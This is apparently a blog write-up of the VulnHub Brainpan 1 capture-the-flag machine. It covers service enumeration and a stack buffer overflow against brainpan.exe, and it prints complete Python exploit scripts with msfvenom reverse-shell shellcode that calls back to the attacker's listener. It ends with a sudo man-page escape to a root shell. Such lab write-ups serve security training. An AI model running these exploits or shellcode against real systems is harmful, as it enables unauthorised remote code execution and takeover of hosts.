---
date: 2022-11-08T08:00:00.000Z
layout: post
title: Buffer Overflow (I)
subtitle: 'CTF BRAINPAN 1 - Buffer Overflow - Stack Based'
description: >-
  CTF writeup about services enumeration, buffer overflow and python scripting.
image: >-
  /assets/img/uploads/bufoverflow1/bufferoverflow1.jpg
optimized_image: >-
  /assets/img/uploads/bufoverflow1/bufferoverflow1.jpg
category: bufferoverflow
tags:
  - Enumeration
  - Buffer-Overflow
  - Reverse-Shell
author: hackforall
paginate: false
---

<br/>

Welcome to HackForAll Blog.

Today, I'm going to solve the BRAINPAN 1 CTF published in the plataform VULNHUB.

The purpose of this machine is to learn how to exploit the stack doing a buffer overflow in a vulnerable
binary file.

So, let's start with it.

<br/>

# Requirements

* VMWARE or similar.
* A Offensive Linux Machine (Kali Linux or Parrot)
* A Windows 7 Machine
* Python 2.7
* Inmunnity Debugger
* MSFvenom
* Wfuzz, Gobuster or similar.
* NMAP
* Patience

<br/>

# Vulnhub Image Download and Deployment

We will go to the following link and download the zip file:

[CTF - BRAINPAN 1 - ZIP](https://download.vulnhub.com/brainpan/Brainpan.zip)

Next, we unzip it and execute the .ova file with VMWARE.

You can assign for example 2Gb of RAM and 2 Cores to properly run the vulnerable machine. In order to have conectivity from Attack Machine to Vulnerable Machine, we need to select NAT network configuration.

Finally, running the machine we obtain something like this:


![placeholder](/assets/img/uploads/bufoverflow1/1.png "Large example image")

In the next phase, we need to know the IP of the vulnerable machine that the DHCP assign automately to it.

<br/>

# ATTACK MACHINE AND INITIAL ENUMERATION

We will start the attack machine and show our IP with the command 

```bash
ifconfig | grep inet | awk '{print $2}' | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | grep -v 127.0.0.1
```

And obtain the IP of the attack machine:

```bash
192.168.74.129/32 -- Network -> 192.168.74.0/24
```

So, we need to enumerate all the up host of the network with nmap:

```bash
sudo netdiscover -P -i ens33 -r  192.168.74.0/24 |grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | awk '{print $1}'
```
```bash
192.168.74.1
192.168.74.2
192.168.74.130 -> The Vulnerable HOST IP.
192.168.74.254
```
<br/>

# VULNERABLE MACHINE ENUMERATION

First we enumerate the services of the vulnerable host using nmap:

```bash
sudo nmap -sS 192.168.74.130 
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-08 20:32 CET
Nmap scan report for 192.168.74.130
Host is up (0.0052s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt
MAC Address: 00:0C:29:7A:F4:16 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

> The -sS flag is for doing a TCP SYN (Stealth) Scan.

We initially found 2 services in the ports 9999 and 10000. Let see what is it:

For port 9999, we try to connect to it with netcat and found a autentication service:

```bash
nc 192.168.74.130 9999
```

![placeholder](/assets/img/uploads/bufoverflow1/2.png "Large example image")

Probably this is the vulnerable parameter.

For port 1000, we try to connect to it with netcat and not works so I try to access via http and found a web:


![placeholder](/assets/img/uploads/bufoverflow1/3.png "Large example image")

Next, we do directory fuzzing in order to found hidden directories and possibles vulnerabilities. We will use wfuzz:

```bash
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.74.130:10000/FUZZ | grep -v "#" | grep -v "404"
```
Parameters:

-w: wordlist path of the fuzzing directory.

--hc: hide the directories that matches with the response code.

![placeholder](/assets/img/uploads/bufoverflow1/4.png "Large example image")

We found a "bin" directory in the web, that allows directory listing:

![placeholder](/assets/img/uploads/bufoverflow1/5.png "Large example image")

We can get the binary with the following command:

```bash
wget http://192.168.74.130:10000/bin/brainpan.exe
```
As the binary file is designed for windows, we will test it in a windown 7 machine. You can found an official .ova in the following link:

[WINDOWS 7 OVA ](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)

The password will be "Passw0rd!"

<br/>

# VULNERABILITY BINARY ANALISYS

First we start the windows machine. It has the IP 192.168.74.131.

![placeholder](/assets/img/uploads/bufoverflow1/7.png "Large example image")

Go to http://192.168.74.130:10000/bin/brainpan.exe to download the binary.

![placeholder](/assets/img/uploads/bufoverflow1/6.png "Large example image")

And we execute the binary and keep running it:

![placeholder](/assets/img/uploads/bufoverflow1/8.png "Large example image")

And check the conection with the attack machine:

![placeholder](/assets/img/uploads/bufoverflow1/9.png "Large example image")

## FUZZING INPUT PARAMETER TEST

Now we need to create a python script to test the input of the service:

```python
#!/usr/bin/python

import socket
import time
import sys

size = 100
ip = "192.168.74.131"
port = 9999

while(size < 1000):
    try:
        print "\nInput buffer of %s bytes" % size
        buffer = "A" * size

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((ip,port))
        s.send(buffer)

        s.close()

        size +=100
        time.sleep(3)

    except:
        print "\nService Crash !!!"
        sys.exit()
```

At this point, we need to start the Inmunnity Debugger to study the behavior of the program and attach the running proccess brainpan.exe:

![placeholder](/assets/img/uploads/bufoverflow1/10.png "Large example image")

The initial state of registers the following:

![placeholder](/assets/img/uploads/bufoverflow1/11.png "Large example image")

Run the python fuzzing script:

![placeholder](/assets/img/uploads/bufoverflow1/12.png "Large example image")

When the service receives a input of 600 bytes, it crashes:

![placeholder](/assets/img/uploads/bufoverflow1/13.png "Large example image")

And we can see that EIP was overwritten with the 41 = A characters that the script sent:

![placeholder](/assets/img/uploads/bufoverflow1/14.png "Large example image")

<br/>

## CALCULATION OF EIP OFFSET AND OVERWRITTING IT
<br/>

Now, we need to search which part of the buffer is in the EIP register using a different string of "AAA...".

<br/>

For that purpose, we can use msf-pattern_create tool:

```bash
msf-pattern_create -l 600

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
```
<br/>

So, the fuzzing script will be as follows:

```python
#!/usr/bin/python

import socket
import time
import sys

size = 600
ip = "192.168.74.131"
port = 9999


try:
    print "\nSending pattern of size: %s" % size
    buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(buffer)
    s.close()
    time.sleep(3)

except:
    print "\nService Crash !!!"
    sys.exit()
```

<br/>

We run the binary, attach the procces to inmunnity debbuger and run the fuzzing script to obtain the value of EIP:

![placeholder](/assets/img/uploads/bufoverflow1/16.png "Large example image")

> The new value is EIP= 35724134

<br/>

And search the byte possition of the chain in the original string using the msf-pattern_offset tool:

```bash
msf-pattern_offset -l 600 -q 35724134

[*] Exact match at offset 524
```

Changing the script will be as follows:

```python
#!/usr/bin/python

import socket
import time
import sys

size = 524
eip = 4
ip = "192.168.74.131"
port = 9999


try:
    print "\nInput buffer of %s bytes" % (size+eip)
    buffer = "A" * size + "B" * eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip,port))
    s.send(buffer)

    s.close()
    
    time.sleep(3)

except:
    print "\nService Crash !!!"
    sys.exit()
```
And we can verify that the bytes from 525-528 (4 bytes) of EIP are the B=42 charater:

![placeholder](/assets/img/uploads/bufoverflow1/17.png "Large example image")

<br/>

## CALCULATE SHELL CODE SPACE AND OVERWRITTE THE ESP REGISTER

<br/>

The shellcode will be allocated after the EIP regsiter, for example, we will add 500 bytes of "C" character:

```python
#!/usr/bin/python

import socket
import time
import sys

size = 524
eip = 4
shell=500
ip = "192.168.74.131"
port = 9999


try:
    print "\nInput buffer of %s bytes" % (size+eip+shell)
    buffer = "A" * size + "B" * eip + "C" * shell

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip,port))
    s.send(buffer)

    s.close()
    
    time.sleep(3)

except:
    print "\nService Crash !!!"
    sys.exit
```
We can verify that the ESP is overwritted by the 500 bytes of "C" character:

![placeholder](/assets/img/uploads/bufoverflow1/18.png "Large example image")

<br/>

## FOUND THE JMP ESP RETURN ADDRESS

Now we need to find a JMP ESP instruction address to redirect the execution of the program to our malicious shell code.

First, using mona.py we look at all the modules to find a valid dll/module:

```bash
!mona modules
```

![placeholder](/assets/img/uploads/bufoverflow1/19.png "Large example image")

> The valid module is brainban.exe.

Next, we need to find a valid OPCODE for the JMP ESP instruction using msf-nasm_shell tool:

```bash
msf-nasm_shell
```
![placeholder](/assets/img/uploads/bufoverflow1/20.png "Large example image")

With this code FFE4 (Hex transformed), we need to find a JMP ESP instruction address using the following command:

```bash
!mona find -s "\xff\xe4" -m "brainpan.exe"
```

![placeholder](/assets/img/uploads/bufoverflow1/21.png "Large example image")

> And we found the address: 0x311712F3.

The address correspond to a valid JMP ESP instruction address:

![placeholder](/assets/img/uploads/bufoverflow1/22.png "Large example image")

<br/>


## OVERWRITE THE EIP WITH JMP ESP RETURN ADDRESS

<br/>

We need to change the "BBBB" string with the JMP ESP RETURN ADDRESS.

```python
#!/usr/bin/python

import socket
import time
import sys

size = 524
eip = "\xf3\x12\x17\x31"
shell = 400
ip = "192.168.74.131"
port = 9999


try:
    print "\nInput buffer of %s bytes" % (size)
    buffer = "A" * size + eip + "C" * shell

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip,port))
    s.send(buffer)

    s.close()
    
    time.sleep(3)

except:
    print "\nService Crash !!!"
    sys.exit()
```

When the script is executed, the EIP has the address of the JMP ESP instruction address.

![placeholder](/assets/img/uploads/bufoverflow1/24.png "Large example image")

And the EIP point to the overflow shell content of C:

![placeholder](/assets/img/uploads/bufoverflow1/23.png "Large example image")

<br/>

## GENERATE THE REVERSE SHELLCODE AND LOCAL TESTING

<br/>

We use msfvenom to create the payload using the following command:

<br/>

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.74.129 LPORT=4444 -f python -b "\x00"

buf =  b""
buf += b"\xb8\xc2\xdd\x8f\x16\xdb\xc9\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x01\xd9\x6d"
buf += b"\xe3\xb4\x39\x86\xef\xe5\xfe\x3a\x9a\x0b\x88\x5c\xea"
buf += b"\x6d\x47\x1e\x98\x28\xe7\x20\x52\x4a\x4e\x26\x95\x22"
buf += b"\x91\x70\x2f\x33\x79\x83\xb0\x22\x26\x0a\x51\xf4\xb0"
buf += b"\x5c\xc3\xa7\x8f\x5e\x6a\xa6\x3d\xe0\x3e\x40\xd0\xce"
buf += b"\xcd\xf8\x44\x3e\x1d\x9a\xfd\xc9\x82\x08\xad\x40\xa5"
buf += b"\x1c\x5a\x9e\xa6"

```


We need to adapt the previous python code to add the payload instead the "C" strings:

```python
#!/usr/bin/python

import socket
import time
import sys

size = 524
eip = "\xf3\x12\x17\x31"
nullops= "\x90"*10

buf += b"\xb8\xc2\xdd\x8f\x16\xdb\xc9\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x01\xd9\x6d"
buf += b"\xe3\xb4\x39\x86\xef\xe5\xfe\x3a\x9a\x0b\x88\x5c\xea"
buf += b"\x6d\x47\x1e\x98\x28\xe7\x20\x52\x4a\x4e\x26\x95\x22"
buf += b"\x91\x70\x2f\x33\x79\x83\xb0\x22\x26\x0a\x51\xf4\xb0"
buf += b"\x5c\xc3\xa7\x8f\x5e\x6a\xa6\x3d\xe0\x3e\x40\xd0\xce"
buf += b"\xcd\xf8\x44\x3e\x1d\x9a\xfd\xc9\x82\x08\xad\x40\xa5"
buf += b"\x1c\x5a\x9e\xa6"


ip = "192.168.74.131"
port = 9999


try:
    print "\nSending malicious input to %s" % (ip)
    buffer = "A" * size + eip + nullops + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip,port))
    s.send(buffer)

    s.close()
    
    time.sleep(3)
    
    print "\nDONE !!!"

except:
    print "\nService Crash !!!"
    sys.exit()
```

Start the service in the windows local machine and execute the python script:


![placeholder](/assets/img/uploads/bufoverflow1/26.png "Large example image")
![placeholder](/assets/img/uploads/bufoverflow1/27.png "Large example image")

As the attacker machine was listening with netcat, we obtain a reverse shell:

![placeholder](/assets/img/uploads/bufoverflow1/28.png "Large example image")

> IT WORKS!!

<br/>

## EXPLOTATION OF REMOTE MACHINE

<br/>

The python script used for exploting the service are the following:

```python
#!/usr/bin/python

import socket
import time
import sys

size = 524
eip = "\xf3\x12\x17\x31"
nullops= "\x90"*10

buf =  b""
buf += b"\xb8\xc2\xdd\x8f\x16\xdb\xc9\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x01\xd9\x6d"
buf += b"\xe3\xb4\x39\x86\xef\xe5\xfe\x3a\x9a\x0b\x88\x5c\xea"
buf += b"\x6d\x47\x1e\x98\x28\xe7\x20\x52\x4a\x4e\x26\x95\x22"
buf += b"\x91\x70\x2f\x33\x79\x83\xb0\x22\x26\x0a\x51\xf4\xb0"
buf += b"\x5c\xc3\xa7\x8f\x5e\x6a\xa6\x3d\xe0\x3e\x40\xd0\xce"
buf += b"\xcd\xf8\x44\x3e\x1d\x9a\xfd\xc9\x82\x08\xad\x40\xa5"
buf += b"\x1c\x5a\x9e\xa6"

ip = "192.168.74.130"
port = 9999


try:
    print "\nSending malicious input to %s" % (ip)
    buffer = "A" * size + eip + nullops + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip,port))
    s.send(buffer)

    s.close()
    
    time.sleep(3)
    
    print "\nDONE !!!"

except:
    print "\nService Crash !!!"
    sys.exit()

```

The remote IP was 192.168.74.130 and has a remote service of brainpan.exe in PORT 9999. Executing the script with the remote IP:

![placeholder](/assets/img/uploads/bufoverflow1/29.png "Large example image")

And obtain a reverse shell in the attacker machine:

![placeholder](/assets/img/uploads/bufoverflow1/30.png "Large example image")

<br/>

## PRIVILEGE SCALATION ON LINUX MACHINE

<br/>

After obtain a reverse shell terminal, we need to do the following:

![placeholder](/assets/img/uploads/bufoverflow1/31.png "Large example image")


We search the binaries that the actual user "puck" would use as root.

> And found anansi_util binary

Running it as sudo, see various options:

![placeholder](/assets/img/uploads/bufoverflow1/32.png "Large example image")


Using the manual option with the command "man" throws a warning message, and the input can be exploited by using ! to execute a command. In my case, we spawn a bash shell:

![placeholder](/assets/img/uploads/bufoverflow1/33.png "Large example image")

> We have got a ROOT Shell.

<br/>
<br/>
<br/>

